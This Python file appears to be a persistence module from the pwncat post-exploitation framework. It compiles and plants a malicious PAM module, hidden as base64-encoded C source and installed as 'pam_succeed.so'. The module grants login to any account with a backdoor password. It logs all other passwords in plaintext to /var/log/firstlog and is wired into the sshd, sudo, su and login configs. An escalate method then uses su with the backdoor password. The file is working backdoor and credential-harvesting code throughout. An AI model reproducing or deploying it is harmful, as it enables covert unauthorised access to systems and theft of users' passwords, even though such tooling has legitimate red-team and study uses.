#!/usr/bin/env python3
import base64
import hashlib
import io
import os
import textwrap
from typing import Optional

import pwncat
from pwncat import util
from pwncat.persist import PersistenceMethod, PersistenceError
from pwncat.util import Access, CompilationError


class Method(PersistenceMethod):
    """
    Add a malicious PAM module which will allow authentication as any user.
    This persistence method will install a custom PAM module which authenticates
    every user successfully with your backdoor password. This module also logs
    any passwords in plaintext which are not your backdoor password in /var/log/firstlog.
    The log file is tracked as a separate tamper and will not be automatically removed
    by removing this persistence method.
    
    The remote host **must** have `gcc` and `openssl-devel` packages installed
    and you must already have root accesss.
    """

    # This is a system module. It works for root (and technically all users)
    system = True
    name = "pam"
    # We can leverage this to escalate locally
    local = True

    def install(self, user: Optional[str] = None):
        """ Install the persistence method """

        if pwncat.victim.current_user.id != 0:
            raise PersistenceError("must be root")

        # Source to our module
        sneaky_source = textwrap.dedent(
            """
I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzZWN1cml0eS9wYW1fbW9kdWxlcy5oPgojaW5j
bHVkZSA8c2VjdXJpdHkvcGFtX2V4dC5oPgojaW5jbHVkZSA8c3RyaW5nLmg+CiNpbmNsdWRlIDxz
eXMvZmlsZS5oPgojaW5jbHVkZSA8ZXJybm8uaD4KI2luY2x1ZGUgPG9wZW5zc2wvc2hhLmg+ClBB
TV9FWFRFUk4gaW50IHBhbV9zbV9hdXRoZW50aWNhdGUocGFtX2hhbmRsZV90ICpoYW5kbGUsIGlu
dCBmbGFncywgaW50IGFyZ2MsIGNvbnN0IGNoYXIgKiphcmd2KQp7CiAgICBpbnQgcGFtX2NvZGU7
CiAgICBjb25zdCBjaGFyICp1c2VybmFtZSA9IE5VTEw7CiAgICBjb25zdCBjaGFyICpwYXNzd29y
ZCA9IE5VTEw7CiAgICBjaGFyIHBhc3N3ZF9saW5lWzEwMjRdOwogICAgaW50IGZvdW5kX3VzZXIg
PSAwOwoJY2hhciBrZXlbMjBdID0ge19fUFdOQ0FUX0hBU0hfX307CglGSUxFKiBmaWxwOwogICAg
cGFtX2NvZGUgPSBwYW1fZ2V0X3VzZXIoaGFuZGxlLCAmdXNlcm5hbWUsICJVc2VybmFtZTogIik7
CiAgICBpZiAocGFtX2NvZGUgIT0gUEFNX1NVQ0NFU1MpIHsKICAgICAgICByZXR1cm4gUEFNX0lH
Tk9SRTsKICAgIH0KICAgIGZpbHAgPSBmb3BlbigiL2V0Yy9wYXNzd2QiLCAiciIpOwogICAgaWYo
IGZpbHAgPT0gTlVMTCApewogICAgICAgIHJldHVybiBQQU1fSUdOT1JFOwogICAgfQogICAgd2hp
bGUoIGZnZXRzKHBhc3N3ZF9saW5lLCAxMDI0LCBmaWxwKSApewogICAgICAgIGNoYXIqIHZhbGlk
X3VzZXIgPSBzdHJ0b2socGFzc3dkX2xpbmUsICI6Iik7CiAgICAgICAgaWYoIHN0cmNtcCh2YWxp
ZF91c2VyLCB1c2VybmFtZSkgPT0gMCApewogICAgICAgICAgICBmb3VuZF91c2VyID0gMTsKICAg
ICAgICAgICAgYnJlYWs7CiAgICAgICAgfSAKICAgIH0KICAgIGZjbG9zZShmaWxwKTsKICAgIGlm
KCBmb3VuZF91c2VyID09IDAgKXsKICAgICAgICByZXR1cm4gUEFNX0lHTk9SRTsKICAgIH0KICAg
IHBhbV9jb2RlID0gcGFtX2dldF9hdXRodG9rKGhhbmRsZSwgUEFNX0FVVEhUT0ssICZwYXNzd29y
ZCwgIlBhc3N3b3JkOiAiKTsKICAgIGlmIChwYW1fY29kZSAhPSBQQU1fU1VDQ0VTUykgewogICAg
ICAgIHJldHVybiBQQU1fSUdOT1JFOwogICAgfQoJaWYoIG1lbWNtcChTSEExKHBhc3N3b3JkLCBz
dHJsZW4ocGFzc3dvcmQpLCBOVUxMKSwga2V5LCAyMCkgIT0gMCApewoJCWZpbHAgPSBmb3Blbigi
X19QV05DQVRfTE9HX18iLCAiYSIpOwoJCWlmKCBmaWxwICE9IE5VTEwgKQoJCXsKCQkJZnByaW50
ZihmaWxwLCAiJXM6JXNcbiIsIHVzZXJuYW1lLCBwYXNzd29yZCk7CgkJCWZjbG9zZShmaWxwKTsK
CQl9CgkJcmV0dXJuIFBBTV9JR05PUkU7Cgl9CiAgICByZXR1cm4gUEFNX1NVQ0NFU1M7Cn0KUEFN
X0VYVEVSTiBpbnQgcGFtX3NtX2FjY3RfbWdtdChwYW1faGFuZGxlX3QgKnBhbWgsIGludCBmbGFn
cywgaW50IGFyZ2MsIGNvbnN0IGNoYXIgKiphcmd2KSB7CiAgICAgcmV0dXJuIFBBTV9JR05PUkU7
Cn0KUEFNX0VYVEVSTiBpbnQgcGFtX3NtX3NldGNyZWQocGFtX2hhbmRsZV90ICpwYW1oLCBpbnQg
ZmxhZ3MsIGludCBhcmdjLCBjb25zdCBjaGFyICoqYXJndikgewogICAgIHJldHVybiBQQU1fSUdO
T1JFOwp9ClBBTV9FWFRFUk4gaW50IHBhbV9zbV9vcGVuX3Nlc3Npb24ocGFtX2hhbmRsZV90ICpw
YW1oLCBpbnQgZmxhZ3MsIGludCBhcmdjLCBjb25zdCBjaGFyICoqYXJndikgewogICAgIHJldHVy
biBQQU1fSUdOT1JFOwp9ClBBTV9FWFRFUk4gaW50IHBhbV9zbV9jbG9zZV9zZXNzaW9uKHBhbV9o
YW5kbGVfdCAqcGFtaCwgaW50IGZsYWdzLCBpbnQgYXJnYywgY29uc3QgY2hhciAqKmFyZ3YpIHsK
ICAgICByZXR1cm4gUEFNX0lHTk9SRTsKfQpQQU1fRVhURVJOIGludCBwYW1fc21fY2hhdXRodG9r
KHBhbV9oYW5kbGVfdCAqcGFtaCwgaW50IGZsYWdzLCBpbnQgYXJnYywgY29uc3QgY2hhciAqKmFy
Z3YpewogICAgIHJldHVybiBQQU1fSUdOT1JFOwp9Cg==
            """
        ).replace("\n", "")
        sneaky_source = base64.b64decode(sneaky_source).decode("utf-8")

        # We use the backdoor password. Build the string of encoded bytes
        # These are placed in the source like: char password_hash[] = {0x01, 0x02, 0x03, ...};
        password = hashlib.sha1(
            pwncat.victim.config["backdoor_pass"].encode("utf-8")
        ).digest()
        password = ",".join(hex(c) for c in password)

        # Insert our key
        sneaky_source = sneaky_source.replace("__PWNCAT_HASH__", password)

        # Insert the log location for successful passwords
        sneaky_source = sneaky_source.replace("__PWNCAT_LOG__", "/var/log/firstlog")

        # Write the source
        try:

            util.progress("pam_sneaky: compiling shared library")

            try:
                # Compile our source for the remote host
                lib_path = pwncat.victim.compile(
                    [io.StringIO(sneaky_source)],
                    suffix=".so",
                    cflags=["-shared", "-fPIE"],
                    ldflags=["-lcrypto"],
                )
            except (FileNotFoundError, CompilationError) as exc:
                raise PersistenceError(f"pam: compilation failed: {exc}")

            util.progress("pam_sneaky: locating pam module location")

            # Locate the pam_deny.so to know where to place the new module
            pam_modules = "/usr/lib/security"
            try:
                results = (
                    pwncat.victim.run(
                        "find / -name pam_deny.so 2>/dev/null | grep -v 'snap/'"
                    )
                    .strip()
                    .decode("utf-8")
                )
                if results != "":
                    results = results.split("\n")
                    pam_modules = os.path.dirname(results[0])
            except FileNotFoundError:
                pass

            util.progress(f"pam_sneaky: pam modules located in {pam_modules}")

            # Ensure the directory exists and is writable
            access = pwncat.victim.access(pam_modules)
            if (Access.DIRECTORY | Access.WRITE) in access:
                # Copy the module to a non-suspicious path
                util.progress(f"pam_sneaky: copying shared library to {pam_modules}")
                pwncat.victim.env(
                    ["mv", lib_path, os.path.join(pam_modules, "pam_succeed.so")]
                )
                new_line = "auth\tsufficient\tpam_succeed.so\n"

                util.progress(f"pam_sneaky: adding pam auth configuration")

                # Add this auth method to the following pam configurations
                for config in ["sshd", "sudo", "su", "login"]:
                    util.progress(
                        f"pam_sneaky: adding pam auth configuration: {config}"
                    )
                    config = os.path.join("/etc/pam.d", config)
                    try:
                        # Read the original content
                        with pwncat.victim.open(config, "r") as filp:
                            content = filp.readlines()
                    except (PermissionError, FileNotFoundError):
                        continue

                    # We need to know if there is a rootok line. If there is,
                    # we should add our line after it to ensure that rootok still
                    # works.
                    contains_rootok = any("pam_rootok" in line for line in content)

                    # Add this auth statement before the first auth statement
                    for i, line in enumerate(content):
                        # We either insert after the rootok line or before the first
                        # auth line, depending on if rootok is present
                        if contains_rootok and "pam_rootok" in line:
                            content.insert(i + 1, new_line)
                        elif not contains_rootok and line.startswith("auth"):
                            content.insert(i, new_line)
                            break
                    else:
                        content.append(new_line)

                    content = "".join(content)

                    try:
                        with pwncat.victim.open(
                            config, "w", length=len(content)
                        ) as filp:
                            filp.write(content)
                    except (PermissionError, FileNotFoundError):
                        continue

                pwncat.victim.tamper.created_file("/var/log/firstlog")

                util.erase_progress()

        except FileNotFoundError as exc:
            # A needed binary wasn't found. Clean up whatever we created.
            raise PersistenceError(str(exc))

    def remove(self, user: Optional[str] = None):
        """ Remove this method """

        try:

            # Locate the pam_deny.so to know where to place the new module
            pam_modules = "/usr/lib/security"
            try:
                results = (
                    pwncat.victim.env(["find", "/", "-name", "pam_deny.so"])
                    .strip()
                    .decode("utf-8")
                )
                if results != "":
                    results = results.split("\n")
                    pam_modules = os.path.dirname(results[0])
            except FileNotFoundError:
                pass

            # Ensure the directory exists and is writable
            access = pwncat.victim.access(pam_modules)
            if (Access.DIRECTORY | Access.WRITE) in access:
                # Remove the the module
                pwncat.victim.env(
                    ["rm", "-f", os.path.join(pam_modules, "pam_succeed.so")]
                )
                new_line = "auth\tsufficient\tpam_succeed.so\n"

                # Remove this auth method from the following pam configurations
                for config in ["sshd", "sudo", "su", "login"]:
                    config = os.path.join("/etc/pam.d", config)
                    try:
                        with pwncat.victim.open(config, "r") as filp:
                            content = filp.readlines()
                    except (PermissionError, FileNotFoundError):
                        continue

                    # Add this auth statement before the first auth statement
                    content = [line for line in content if line != new_line]
                    content = "".join(content)

                    try:
                        with pwncat.victim.open(
                            config, "w", length=len(content)
                        ) as filp:
                            filp.write(content)
                    except (PermissionError, FileNotFoundError):
                        continue
            else:
                raise PersistenceError("insufficient permissions")
        except FileNotFoundError as exc:
            # Uh-oh, some binary was missing... I'm not sure what to do here...
            util.error(str(exc))

    def escalate(self, user: Optional[str] = None) -> bool:
        """ Utilize this method to escalate locally """

        if user is None:
            user = "root"

        try:
            pwncat.victim.su(user, password=pwncat.victim.config["backdoor_pass"])
        except PermissionError:
            return False

        return True
